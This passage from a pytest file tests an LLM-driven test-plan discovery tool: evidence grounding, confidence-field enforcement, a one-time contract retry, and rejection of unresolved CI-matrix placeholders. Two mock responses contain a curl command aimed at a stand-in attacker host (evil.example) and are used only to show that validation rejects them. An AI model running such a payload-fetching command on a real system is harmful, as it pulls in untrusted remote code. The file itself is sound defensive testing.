        confirms the deterministic boundary, not just prompt wording."""
        repo = self._node_test_runner_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["node", "--test"],
            result_strategy="tap", result_output_path="/tmp/result.tap",
            runtime_family="node", evidence=["package.json"],
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_minimist_shaped_evidence_choosing_tap_by_name_alone_is_still_a_valid_response_shape(self, tmp_path):
        """Documents the actual enforcement boundary honestly: nothing in
        discover_test_plan's DETERMINISTIC layer can tell "the model
        correctly identified genuine unprompted TAP" apart from "the
        model guessed tap from the word tap in a script name" -- that
        distinction is a PROMPT-ONLY quality improvement (see
        TestTapResultStrategyPromptContract), not a new validation rule.
        A structurally well-formed "tap" plan (null output path,
        reasoning citing real evidence) for the minimist-shaped repo
        still passes deterministic validation even though, per real
        inspection, minimist's actual `npm test` does NOT emit TAP by
        default -- exactly like an incorrect "junit" self-report would
        also still validate if internally consistent. This is why the
        real stage-replay observational check (not this unit test) is
        what tells us whether the prompt improvement actually changed
        live model behavior for minimist specifically."""
        repo = _minimist_shaped_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[["npm", "ci"]], test_command=["npm", "test"],
            result_strategy="tap", result_output_path=None,
            runtime_family="node", evidence=["package.json", "package-lock.json"],
            reasoning_summary="package.json's scripts.test runs tap, so npm test emits TAP.",
            confidence="medium",
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.result_strategy == "tap"


class TestRepositoryGroundingContract:
    """General-principle contract tests (not ecosystem providers -- every
    test here goes through the exact same generic discover_test_plan/
    validate_plan pipeline; no production branch is specific to any of
    these languages/tools). See the module docstring's "Repository-
    grounding" section."""

    def test_package_manager_test_script_preserves_package_manager_entry_point(self, tmp_path):
        """Same principle as the minimist fixture, different package
        manager (yarn) -- proves this isn't an npm-specific carve-out."""
        (tmp_path / "package.json").write_text(
            json.dumps({"scripts": {"test": "jest --coverage"}}), encoding="utf-8",
        )
        (tmp_path / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[["yarn", "install"]], test_command=["yarn", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json", "yarn.lock"],
            reasoning_summary="yarn.lock establishes yarn; using the evidenced yarn test script as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("yarn", "test")

    def test_makefile_test_target_is_preserved_not_unpacked(self, tmp_path):
        (tmp_path / "Makefile").write_text(
            "test:\n\tgo vet ./... && go test ./...\n", encoding="utf-8",
        )
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["make", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="go", evidence=["Makefile"],
            reasoning_summary="Makefile defines a test target; using it as-is rather than the commands inside it.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("make", "test")

    def test_ci_directly_running_pytest_is_grounded_as_a_direct_command(self, tmp_path):
        """A direct command is fine when the direct command IS the
        repository's own evidence -- this is not the reconstruction
        problem the fix targets."""
        (tmp_path / "pyproject.toml").write_text("[tool.pytest.ini_options]\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text(
            "jobs:\n  test:\n    steps:\n      - run: python -m pytest tests/\n", encoding="utf-8",
        )
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["python", "-m", "pytest", "tests/"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="python", evidence=["pyproject.toml", ".github/workflows/ci.yml"],
            reasoning_summary="CI directly runs `python -m pytest tests/`; using that evidenced command as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("python", "-m", "pytest", "tests/")

    def test_ci_directly_running_go_test_is_grounded_as_a_direct_command(self, tmp_path):
        (tmp_path / "go.mod").write_text("module example.com/x\n\ngo 1.22\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: go test ./...\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[], test_command=["go", "test", "./..."],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="go", evidence=["go.mod", ".github/workflows/ci.yml"],
            reasoning_summary="CI directly runs `go test ./...`; using that evidenced command as-is.",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("go", "test", "./...")

    def test_repository_test_script_preservation_is_instructed_in_the_prompt(self):
        """The repository-script case (e.g. ./scripts/test.sh) is covered
        by the SAME generic instruction as the package-manager/Makefile
        cases above -- asserted at the prompt-content level here because
        a bare script path is not itself in test_plan_validation.
        ALLOWED_COMMAND_BINARIES (a separate, pre-existing, unchanged
        allowlist this task does not touch -- see
        test_prompt_never_widens_allowed_binaries_for_this_fix)."""
        assert "./scripts/test.sh" in _SYSTEM_PROMPT
        assert "use that script, never its\n       internal commands" in _SYSTEM_PROMPT

    def test_conflicting_evidence_is_reconciled_not_mechanically_resolved(self, tmp_path):
        """Behavioral half of the conflicting-evidence contract: when the
        model DOES follow the instruction and explains its reconciliation
        in reasoning_summary, the plan is accepted normally -- reconciling
        evidence is not itself a confidence penalty."""
        (tmp_path / "package.json").write_text(
            json.dumps({"scripts": {"test": "old-runner", "test:ci": "jest"}}), encoding="utf-8",
        )
        (tmp_path / "package-lock.json").write_text("{}\n", encoding="utf-8")
        wf = tmp_path / ".github" / "workflows"
        wf.mkdir(parents=True)
        (wf / "ci.yml").write_text("jobs:\n  test:\n    steps:\n      - run: npm run test:ci\n", encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            setup_commands=[["npm", "ci"]], test_command=["npm", "run", "test:ci"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json", "package-lock.json", ".github/workflows/ci.yml"],
            reasoning_summary=(
                "package.json's scripts.test is stale; CI actually runs `npm run test:ci`, "
                "which is the current path -- using that instead."
            ),
            confidence="high",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is not None
        assert plan.test_command == ("npm", "run", "test:ci")

    def test_insufficient_evidence_fails_closed_via_low_confidence(self, tmp_path):
        """When the model follows the fail-closed instruction (reports
        "low" confidence rather than guessing), discovery must produce no
        plan -- NO PLAN > GUESSED PLAN, enforced end to end."""
        (tmp_path / "package.json").write_text(json.dumps({"name": "unclear-pkg"}), encoding="utf-8")
        llm = _FakeLLM(_valid_response(
            # Even a structurally well-formed, otherwise-valid-looking
            # command must still be discarded here -- confidence is
            # checked BEFORE validation, so this isn't testing "the
            # command happened to be rejected," it's testing the
            # fail-closed policy itself.
            setup_commands=[], test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", evidence=["package.json"],
            reasoning_summary="package.json has no scripts.test and no other test evidence was shown.",
            confidence="low",
        ))
        plan = discover_test_plan(tmp_path, llm)
        assert plan is None


class TestConfidenceOutputChecklistPromptContract:
    """Prompt-content contract for the confidence-omission fix (see the
    module docstring's added confidence paragraph, and the real minimist
    stage-replay run that exposed it: an otherwise well-formed response
    that omitted "confidence" entirely, despite the schema block already
    naming it). These assert on the SYSTEM PROMPT's text only -- no live
    LLM call anywhere in this class."""

    def test_prompt_ends_with_a_complete_output_checklist(self):
        """The checklist is the smallest clean improvement: a short,
        mandatory list of every schema key, placed at the very end of the
        instruction block -- immediately before the repository evidence
        the model reads next (evidence is a separate user_message, so the
        end of _SYSTEM_PROMPT IS "immediately before repository
        evidence")."""
        assert "Before returning, verify" in _SYSTEM_PROMPT
        assert "every schema key" in _SYSTEM_PROMPT
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        # Nothing of substance follows the checklist -- it is the LAST
        # thing the model reads in this prompt.
        assert _SYSTEM_PROMPT[checklist_pos:].count("\n\n") <= 1

    def test_checklist_names_every_schema_key(self):
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
        for key in (
            "setup_commands", "test_command", "result_strategy", "result_output_path",
            "runtime_family", "runtime_version_hint", "evidence", "reasoning_summary", "confidence",
        ):
            assert key in checklist_text

    def test_confidence_is_called_out_as_mandatory_with_exact_values(self):
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
        assert "confidence MUST be present" in checklist_text
        assert '"high", "medium"' in checklist_text and '"low"' in checklist_text

    def test_checklist_is_a_small_addition_not_a_prompt_rewrite(self):
        """Guards against this fix growing into a second copy of the
        schema/rules -- the checklist itself must stay short."""
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
        assert len(checklist_text) < 600

    def test_prompt_still_declares_confidence_in_the_schema_block_too(self):
        """The checklist is additive, not a replacement -- the original
        schema-block mention of confidence (present before this fix) is
        untouched."""
        schema_pos = _SYSTEM_PROMPT.index('"confidence": "high" | "medium" | "low"')
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        assert schema_pos < checklist_pos


class TestStructuredEvidenceReinforcementPromptContract:
    """Prompt-content contract for the structured-evidence-upgrade
    reinforcement -- the real urllib3 CVE-2023-43804 evidence shape
    (pyproject.toml + noxfile.py + CI showing a direct pytest invocation)
    already validates end-to-end as a "junit" plan (see
    TestUrllib3ShapedRealRunRegression), but a real run still chose
    exit_code -- this is a reinforcing nudge, not a rewrite, placed
    immediately before the existing final checklist so it stays near the
    end without displacing the confidence checklist as the LAST thing the
    model reads (see TestConfidenceOutputChecklistPromptContract)."""

    def test_reinforcement_text_present(self):
        assert 'Before settling on result_strategy = "exit_code"' in _SYSTEM_PROMPT
        assert "directly-\n  evidenced invocation" in _SYSTEM_PROMPT or "directly-evidenced invocation" in _SYSTEM_PROMPT

    def test_reinforcement_mentions_wrapper_tools_generically_not_by_hardcoding_one(self):
        """nox/tox are cited only as illustrative examples of a wrapper
        category, not hardcoded behavior -- the rule itself is about ANY
        wrapper vs. a directly-evidenced invocation."""
        assert "nox/tox" in _SYSTEM_PROMPT
        assert "wrapper/session tool" in _SYSTEM_PROMPT

    def test_reinforcement_precedes_the_final_checklist(self):
        """The confidence checklist must remain the LAST thing the model
        reads -- this reinforcement is folded in just before it, not
        appended after it."""
        reinforcement_pos = _SYSTEM_PROMPT.index('Before settling on result_strategy = "exit_code"')
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        assert reinforcement_pos < checklist_pos

    def test_confidence_checklist_is_still_the_very_last_thing(self):
        """Regression guard: this fix must not disturb the pre-existing
        invariant that nothing of substance follows the confidence
        checklist."""
        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
        assert _SYSTEM_PROMPT[checklist_pos:].count("\n\n") == 0


class TestConfidenceContractEnforcedConsistently:
    """The confidence-contract fix must apply consistently regardless of
    prompt wording or which real-run fixture shape triggers it --
    missing/malformed confidence is REJECTED outright; a model-reported
    "low" is still the one case that blocks discovery for a different
    (policy, not contract) reason. Same behavior matrix as
    TestConfidenceMatrix above, asserted again here specifically against
    additional real-shaped fixtures (this class previously asserted the
    OPPOSITE -- silent "unknown" substitution and acceptance -- as
    correct; that was the real urllib3 replay bug this fix closes)."""

    def test_missing_confidence_is_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response_missing("confidence"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_malformed_confidence_is_rejected(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence=["high"]))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_valid_high_medium_preserved_low_still_blocks_discovery(self, tmp_path):
        for level in ("high", "medium", "low"):
            llm = _FakeLLM(_valid_response(confidence=level))
            plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
            if level == "low":
                assert plan is None  # unchanged policy rejection, see TestConfidenceMatrix
            else:
                assert plan is not None
                assert plan.confidence == level

    def test_malformed_confidence_rejection_composes_with_execution_validation(self, tmp_path):
        """Confidence and execution-safety validation are independent
        rejection paths -- a response broken on BOTH counts is still
        just as rejected as one broken on either alone."""
        llm = _FakeLLM(_valid_response(
            confidence="totally-sure!!!",
            test_command=["curl", "http://evil.example/payload.sh"],
        ))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None

    def test_real_minimist_shaped_omission_is_now_rejected(self, tmp_path):
        """Reproduces the exact real-run shape reported for the minimist
        stage replay: a fully execution-critical-valid exit_code plan
        with "confidence" omitted outright. Previously silently accepted
        via the "unknown" fallback -- now rejected, the same as any other
        confidence-contract violation."""
        repo = _minimist_shaped_repo(tmp_path)
        llm = _FakeLLM(json.dumps({
            "setup_commands": [],
            "test_command": ["npm", "test"],
            "result_strategy": "exit_code",
            "result_output_path": None,
            "runtime_family": "node",
            "runtime_version_hint": None,
            "evidence": ["package.json"],
            "reasoning_summary": (
                "package.json defines scripts.test (tap test/*.js); the repository-owned "
                "entry point `npm test` is used as-is."
            ),
            # "confidence" deliberately absent -- the real observed bug.
        }))
        plan = discover_test_plan(repo, llm)
        assert plan is None


class TestBoundedContractRepairRetry:
    """The bounded S10 contract-repair retry (real urllib3 full-run
    finding: a semantically correct, well-evidenced plan was rejected
    outright merely for omitting `confidence`). Exactly one retry, and
    ONLY for the three narrow, mechanical output-contract violations
    _parse_response marks repairable: missing required key(s), an
    invalid `confidence`, or an invalid `result_strategy`. Every other
    rejection reason -- including cross-field semantic inconsistencies,
    which are DELIBERATELY not retried in this slice -- makes exactly one
    LLM call, exactly as before this fix."""

    # 1. missing confidence -> exactly one retry -> valid second response accepted
    def test_missing_confidence_then_valid_response_is_accepted_after_one_retry(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert len(llm.calls) == 2

    # 2. missing confidence twice -> exactly two calls total -> rejected
    def test_missing_confidence_twice_is_rejected_after_exactly_two_calls(self, tmp_path):
        response = _valid_response_missing("confidence")
        llm = _SequentialFakeLLM([response, response])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 2

    # 3. missing another required key -> exactly one retry
    def test_missing_another_required_key_retries_once(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response_missing("result_strategy"), _valid_response()])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert len(llm.calls) == 2

    # 4. invalid result_strategy -> exactly one retry
    def test_invalid_result_strategy_retries_once(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response(result_strategy="bogus"), _valid_response()])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert len(llm.calls) == 2

    # 5. valid first response -> one call only
    def test_valid_first_response_makes_exactly_one_call(self, tmp_path):
        llm = _FakeLLM(_valid_response())
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert len(llm.calls) == 1

    # 6. malformed/unparseable JSON -> one call only
    def test_unparseable_json_never_retries(self, tmp_path):
        llm = _FakeLLM("this is not json at all")
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 1

    # 7. hallucinated evidence -> one call only
    def test_hallucinated_evidence_citation_never_retries(self, tmp_path):
        llm = _FakeLLM(_valid_response(evidence=["tox.ini"]))  # never shown to the model
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 1

    # 8. validate_plan rejection -> one call only
    def test_deterministic_validation_rejection_never_retries(self, tmp_path):
        llm = _FakeLLM(_valid_response(test_command=["curl", "evil.example.com"]))  # unrecognized binary
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 1

    # 9. empty test_command + confidence="low" -> one call only
    def test_deliberate_low_confidence_empty_plan_never_retries(self, tmp_path):
        llm = _FakeLLM(_valid_response(test_command=[], confidence="low"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 1

    # 10. empty test_command + confidence="medium" remains rejected with one call only
    def test_empty_command_with_non_low_confidence_remains_rejected_without_retry(self, tmp_path):
        """Deliberately NOT retried in this slice: a cross-field semantic
        inconsistency, not a narrow schema-completeness/enum violation --
        see _parse_response's own docstring on why this stays out of
        scope for now."""
        llm = _FakeLLM(_valid_response(test_command=[], confidence="medium"))
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 1

    # Also: the plain "self-reported low confidence on a real command"
    # policy rejection must not retry either -- kept from the prior
    # regression guard this class replaces.
    def test_low_confidence_self_report_never_retries(self, tmp_path):
        llm = _FakeLLM(_valid_response(confidence="low"))
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert len(llm.calls) == 1

    # 11. retry call is traced under test_plan_discovery_contract_retry
    def test_retry_call_is_tagged_with_the_contract_retry_stage(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        stages = [call[2] for call in llm.calls]
        assert stages == ["test_plan_discovery", "test_plan_discovery_contract_retry"]

    def test_retry_prompt_names_only_the_violation_and_asks_for_a_complete_object(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), _valid_response()])
        discover_test_plan(_repo_with_evidence(tmp_path), llm)
        retry_user_message = llm.calls[1][1]
        assert "missing required field(s): confidence" in retry_user_message
        assert "complete, corrected JSON object" in retry_user_message

    def test_malformed_confidence_value_also_retries_once(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response(confidence=42), _valid_response()])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is not None
        assert len(llm.calls) == 2

    def test_retry_llm_call_failure_is_rejected_not_raised(self, tmp_path):
        llm = _SequentialFakeLLM([_valid_response_missing("confidence"), RuntimeError("provider unavailable")])
        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
        assert plan is None
        assert len(llm.calls) == 2


class TestParseResponseRepairableClassification:
    """Unit coverage for _parse_response's own `repairable` flag --
    isolated from discover_test_plan's retry orchestration."""

    def test_missing_required_key_is_repairable(self):
        _, reason, repairable = _parse_response(_valid_response_missing("confidence"))
        assert repairable is True
        assert reason is not None

    def test_invalid_confidence_value_is_repairable(self):
        _, _, repairable = _parse_response(_valid_response(confidence="sure, why not"))
        assert repairable is True

    def test_invalid_result_strategy_is_repairable(self):
        _, _, repairable = _parse_response(_valid_response(result_strategy="bogus"))
        assert repairable is True

    def test_unparseable_json_is_not_repairable(self):
        _, _, repairable = _parse_response("not json at all")
        assert repairable is False

    def test_wrong_type_for_test_command_is_not_repairable(self):
        _, _, repairable = _parse_response(_valid_response(test_command="pytest"))
        assert repairable is False

    def test_evidence_bound_violation_is_not_repairable(self):
        _, _, repairable = _parse_response(_valid_response(evidence=["f.py"] * 100))
        assert repairable is False

    def test_valid_response_repairable_is_false(self):
        candidate, reason, repairable = _parse_response(_valid_response())
        assert candidate is not None
        assert reason is None
        assert repairable is False


# 12. stage registry owns both S10 LLM tags
class TestStageRegistryOwnsBothS10LLMTags:
    def test_test_analysis_and_plan_owns_discovery_and_contract_retry_tags(self):
        from utilities.autopatcher.stage_registry import STAGE_OWNED_LLM_TAGS, TEST_ANALYSIS_AND_PLAN
        assert STAGE_OWNED_LLM_TAGS[TEST_ANALYSIS_AND_PLAN] == (
            "test_plan_discovery", "test_plan_discovery_contract_retry",
        )


class TestParameterizedValuePromptContract:
    """Prompt-content contract for the parameterized-CI-value fix (real
    urllib3 replay finding: a shell expansion resolving a CI matrix
    dimension -- "test-$PYTHON_VERSION" -- was instantiated into an
    unevidenced concrete command, "test-3.12", which then silently ran
    against a runtime that didn't actually have Python 3.12). These
    assert on the SYSTEM PROMPT's text only -- no live LLM call."""

    @staticmethod
    def _rule_text() -> str:
        """The "PARAMETERIZED VALUES" rule's own text, isolated by
        finding the next TOP-LEVEL bullet ("\\n- ", a line starting with
        a hyphen) in the ORIGINAL prompt -- never an in-line "--" em dash,
        which the prompt uses throughout and which whitespace-normalizing
        first would make indistinguishable from a real bullet boundary.
        Whitespace is normalized only AFTER slicing, so a multi-word
        phrase can still be matched regardless of the prompt's own manual
        line-wrapping."""
        rule_pos = _SYSTEM_PROMPT.index("PARAMETERIZED VALUES")
        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos)
        return re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])

    def test_rule_present_and_generic_across_placeholder_kinds(self):
        rule_text = self._rule_text()
        for concept in ("shell expansion", "CI matrix expression", "template substitution", "build-matrix"):
            assert concept in rule_text

    def test_rule_does_not_special_case_a_single_ecosystem(self):
        """GitHub Actions / Python may appear as ILLUSTRATIVE examples
        (matching how every other rule in this prompt cites concrete
        examples) but the rule's own governing language must be
        ecosystem-agnostic -- it must also apply to, e.g., a Node CI
        matrix or a Rust toolchain matrix, not just Python interpreters."""
        rule_text = self._rule_text()
        assert "environment variable" in rule_text or "matrix" in rule_text
        assert "placeholder" in rule_text

    def test_rule_instructs_preferring_a_non_parameterized_alternative(self):
        assert "non-parameterized" in self._rule_text()

    def test_rule_treats_unresolvable_placeholder_as_insufficient_evidence(self):
        rule_text = self._rule_text()
        assert "insufficient" in rule_text or "do not guess" in rule_text.lower()


def _matrix_shaped_python_repo(tmp_path: Path) -> Path:
    """A urllib3-shaped repository: a noxfile.py session parameterized by
    Python version, and a CI workflow whose step resolves the concrete
    version from a build matrix via a shell expansion this module's own
    execution environment cannot see."""
    (tmp_path / "noxfile.py").write_text(
        "import nox\n\n"
        "@nox.session(python=['3.9', '3.10', '3.11', '3.12'])\n"
        "def test(session):\n"
        "    session.run('pytest', 'test/')\n",
        encoding="utf-8",
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "name: CI\n"
        "on: [push]\n"
        "jobs:\n"
        "  test:\n"
        "    strategy:\n"
        "      matrix:\n"
        "        python-version: ['3.9', '3.10', '3.11', '3.12']\n"
        "    steps:\n"
        "      - name: Install\n"
        "        run: python -m pip install --upgrade pip nox\n"
        "      - name: Run tests\n"
        "        run: nox -s ${NOX_SESSION:-test-$PYTHON_VERSION} --error-on-missing-interpreters\n",
        encoding="utf-8",
    )
    return tmp_path


def _matrix_shaped_node_repo(tmp_path: Path) -> Path:
    """Non-Python-shaped analog: a Node CI workflow whose step resolves a
    concrete Node version from a build matrix via a GitHub-Actions-style
    template expression."""
    (tmp_path / "package.json").write_text(
        json.dumps({"scripts": {"test": "jest"}}), encoding="utf-8",
    )
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "name: Node CI\n"
        "on: [push]\n"
        "jobs:\n"
        "  test:\n"
        "    strategy:\n"
        "      matrix:\n"
        "        node-version: [16, 18, 20]\n"
        "    steps:\n"
        "      - uses: actions/setup-node@v3\n"
        "        with:\n"
        "          node-version: ${{ matrix.node-version }}\n"
        "      - name: Run tests\n"
        "        run: npm test\n",
        encoding="utf-8",
    )
    return tmp_path


class TestParameterizedValueDoesNotSilentlyMaterialize:
    """Behavioral coverage: repository evidence establishing a
    PARAMETERIZED command (matrix possibilities, an unresolved shell/CI
    expression) is not, by itself, evidence for any ONE concrete value.
    This module cannot simulate "the LLM refuses to guess" against a real
    model -- these tests instead prove the surrounding deterministic
    machinery behaves correctly for both the well-behaved and the
    non-compliant response shapes such a repository could produce."""

    def test_well_behaved_response_choosing_a_non_parameterized_entry_point_is_accepted(self, tmp_path):
        """If the model instead grounds a plain, non-parameterized
        session (evidenced by the noxfile itself defining one, or by
        preferring low confidence), that plan is accepted normally --
        this fix does not forbid a SAFE resolution, only an invented one."""
        repo = _matrix_shaped_python_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[["python", "-m", "pip", "install", "--upgrade", "pip", "nox"]],
            test_command=["nox", "-s", "test"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["noxfile.py", ".github/workflows/ci.yml"],
            reasoning_summary=(
                "The CI-evidenced test step resolves a matrix-specific Python version this "
                "environment cannot establish; using the bare session name avoids guessing one."
            ),
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.test_command == ("nox", "-s", "test")

    def test_well_behaved_response_declaring_low_confidence_is_rejected_safely(self, tmp_path):
        """The other safe response: the model recognizes it cannot ground
        a concrete value and says so via low confidence -- already-
        existing policy correctly declines to spend a Docker build on it."""
        repo = _matrix_shaped_python_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            test_command=["nox", "-s", "test-3.12"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["noxfile.py", ".github/workflows/ci.yml"],
            confidence="low",
            reasoning_summary="Cannot confirm which Python version this environment provides.",
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_residual_unresolved_placeholder_syntax_is_rejected_by_existing_validation(self, tmp_path):
        """A non-compliant response that leaves the template syntax
        LITERALLY unresolved (rather than fabricating a concrete value)
        is still caught -- by the EXISTING shell-metacharacter check
        (test_plan_validation._SHELL_METACHAR_RE already forbids "$" in
        any token), with no new validation code needed for this shape."""
        repo = _matrix_shaped_python_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            test_command=["nox", "-s", "${NOX_SESSION:-test-$PYTHON_VERSION}"],
            result_strategy="exit_code", result_output_path=None,
            evidence=["noxfile.py", ".github/workflows/ci.yml"],
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_non_python_shaped_matrix_placeholder_also_rejected_when_unresolved(self, tmp_path):
        """Generic across ecosystems -- the same residual-syntax backstop
        applies to a GitHub-Actions-style ${{ }} template expression in a
        Node-shaped repository, not just a Python/shell one."""
        repo = _matrix_shaped_node_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["npm", "test", "--", "${{ matrix.node-version }}"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", runtime_version_hint=None,
            evidence=["package.json", ".github/workflows/ci.yml"],
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is None

    def test_non_python_shaped_repo_choosing_the_evidenced_plain_command_is_accepted(self, tmp_path):
        """The safe path also works generically: package.json's own
        scripts.test entry point needs no matrix value at all."""
        repo = _matrix_shaped_node_repo(tmp_path)
        llm = _FakeLLM(_valid_response(
            setup_commands=[],
            test_command=["npm", "test"],
            result_strategy="exit_code", result_output_path=None,
            runtime_family="node", runtime_version_hint=None,
            evidence=["package.json"],
            reasoning_summary="package.json defines scripts.test; used as-is, no matrix value needed.",
        ))
        plan = discover_test_plan(repo, llm)
        assert plan is not None
        assert plan.test_command == ("npm", "test")


class TestInsufficientEvidencePromptContract:
    """Prompt-content contract for the empty-test_command "no executable
    plan" mechanism (real urllib3 replay finding: the prompt told the
    model never to invent or leave an unresolved CI-matrix placeholder in
    test_command, but gave it no OTHER structurally valid way to populate
    a nominally-required field when no command could be honestly
    grounded -- so it left the placeholder literally in place). These
    assert on the SYSTEM PROMPT's text only -- no live LLM call."""

    @staticmethod
    def _rule_text() -> str:
        # The bullet DEFINITION, not the earlier schema-block cross-
        # reference to it (the schema block mentions "INSUFFICIENT
        # EVIDENCE" by name before this rule is even reached).
        rule_pos = _SYSTEM_PROMPT.index("- INSUFFICIENT EVIDENCE:")
        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos + 10)
        return re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])

    def test_schema_documents_the_empty_array_option(self):
        normalized = re.sub(r"\s+", " ", _SYSTEM_PROMPT)
        assert '"test_command": [<argv tokens>] | []' in normalized

    def test_rule_names_the_exact_mechanism(self):
        rule_text = self._rule_text()
        assert '`[]`' in rule_text or "[]" in rule_text
        assert "confidence" in rule_text.lower() and "low" in rule_text

    def test_rule_forbids_leftover_unresolved_placeholder_fragments(self):
        rule_text = self._rule_text()
        assert "unresolved placeholder" in rule_text.lower()

    def test_rule_states_empty_command_requires_low_confidence(self):
        rule_text = self._rule_text()
        assert "only" in rule_text.lower()
        assert "medium" in rule_text.lower() and "high" in rule_text.lower()

    def test_parameterized_values_rule_cross_references_the_mechanism(self):
        """The PARAMETERIZED VALUES rule (a separate, earlier fix) must
        point at this exact mechanism rather than leaving its own vague
        "insufficient evidence" cross-reference unresolved."""
        rule_pos = _SYSTEM_PROMPT.index("PARAMETERIZED VALUES")
        next_bullet = _SYSTEM_PROMPT.index("\n- ", rule_pos)
        rule_text = re.sub(r"\s+", " ", _SYSTEM_PROMPT[rule_pos:next_bullet])
        assert "INSUFFICIENT EVIDENCE" in rule_text
        assert "empty test_command" in rule_text or "empty array" in rule_text


def _urllib3_matrix_placeholder_response(**overrides) -> str:
    """The exact real urllib3 CVE-2023-43804 S10 replay payload that
    exposed this contract gap: an unresolved GitHub-Actions-style matrix
    expression left literally in test_command, confidence "low"."""
    payload = {
        "setup_commands": [["python", "-m", "pip", "install", "--upgrade", "pip", "setuptools", "nox"]],
        "test_command": ["nox", "-s", "test-${{ matrix.python-version }}", "--error-on-missing-interpreters"],
        "result_strategy": "exit_code",
        "result_output_path": None,
        "runtime_family": "python",
        "runtime_version_hint": None,
        "evidence": ["noxfile.py", ".github/workflows/ci.yml", "dev-requirements.txt", "pyproject.toml"],
        "reasoning_summary": (
            "The CI-evidenced session name is parameterized by a build matrix; no concrete "
